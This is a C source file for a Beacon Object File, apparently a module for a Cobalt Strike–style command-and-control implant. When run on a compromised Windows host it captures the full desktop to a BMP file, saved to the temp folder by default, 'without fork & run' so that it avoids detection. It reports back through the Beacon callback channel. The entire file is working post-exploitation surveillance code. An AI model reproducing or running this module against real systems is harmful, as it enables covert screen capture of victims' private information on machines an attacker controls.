/*
 * screenshot [path] - capture the desktop to a 32-bit BMP without fork & run.
 */
#include "beacon.h"
#include "bofdefs.h"
#include "helpers.h"

void go(char *args, int alen)
{
    datap parser;
    char *out = "";
    int olen = 0;
    char path[512];
    int w, h;
    HDC screen, mem;
    HBITMAP bmp;
    BITMAPINFO bi;
    BITMAPFILEHEADER fh;
    BITMAPINFOHEADER ih;
    DWORD imgsize;
    BYTE *pixels;
    HANDLE f;
    DWORD written = 0;
    BOOL ok = FALSE;

    if (args && alen > 0) {
        BeaconDataParse(&parser, args, alen);
        out = BeaconDataExtract(&parser, &olen);
        if (!out) out = "";
    }

    if (out[0]) {
        bof_strncpy(path, out, sizeof(path));
    } else {
        char tmp[256];
        KERNEL32$GetTempPathA(sizeof(tmp), tmp);
        bof_strncpy(path, tmp, sizeof(path));
        bof_strncat(path, "bof_shot.bmp", sizeof(path) - bof_strlen(path) - 1);
    }

    w = USER32$GetSystemMetrics(0);
    h = USER32$GetSystemMetrics(1);
    if (w <= 0 || h <= 0) return;

    screen = USER32$GetDC(NULL);
    mem = GDI32$CreateCompatibleDC(screen);
    bmp = GDI32$CreateCompatibleBitmap(screen, w, h);
    if (!screen || !mem || !bmp) goto cleanup;

    GDI32$SelectObject(mem, bmp);
    if (!GDI32$BitBlt(mem, 0, 0, w, h, screen, 0, 0, SRCCOPY)) goto cleanup;

    imgsize = (DWORD)w * (DWORD)h * 4;
    pixels = (BYTE *)KERNEL32$VirtualAlloc(NULL, imgsize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!pixels) goto cleanup;

    bof_memzero(&bi, sizeof(bi));
    bi.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
    bi.bmiHeader.biWidth = w;
    bi.bmiHeader.biHeight = -h;
    bi.bmiHeader.biPlanes = 1;
    bi.bmiHeader.biBitCount = 32;
    bi.bmiHeader.biCompression = BI_RGB;

    if (!GDI32$GetDIBits(mem, bmp, 0, (UINT)h, pixels, &bi, DIB_RGB_COLORS)) {
        KERNEL32$VirtualFree(pixels, 0, MEM_RELEASE);
        goto cleanup;
    }

    bof_memzero(&fh, sizeof(fh));
    fh.bfType = 0x4D42;
    fh.bfOffBits = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);
    fh.bfSize = fh.bfOffBits + imgsize;

    bof_memcpy(&ih, &bi.bmiHeader, sizeof(ih));
    ih.biSizeImage = imgsize;

    f = KERNEL32$CreateFileA(path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
    if (f != INVALID_HANDLE_VALUE) {
        KERNEL32$WriteFile(f, &fh, sizeof(fh), &written, NULL);
        KERNEL32$WriteFile(f, &ih, sizeof(ih), &written, NULL);
        KERNEL32$WriteFile(f, pixels, imgsize, &written, NULL);
        KERNEL32$CloseHandle(f);
        ok = TRUE;
    }

    KERNEL32$VirtualFree(pixels, 0, MEM_RELEASE);

cleanup:
    if (bmp) GDI32$DeleteObject(bmp);
    if (mem) GDI32$DeleteDC(mem);
    if (screen) USER32$ReleaseDC(NULL, screen);

    if (ok)
        BeaconPrintf(CALLBACK_OUTPUT, "Screenshot saved: %s (%dx%d)\n", path, w, h);
    else
        BeaconPrintf(CALLBACK_ERROR, "screenshot failed: %lu\n",
                     (unsigned long)KERNEL32$GetLastError());
}
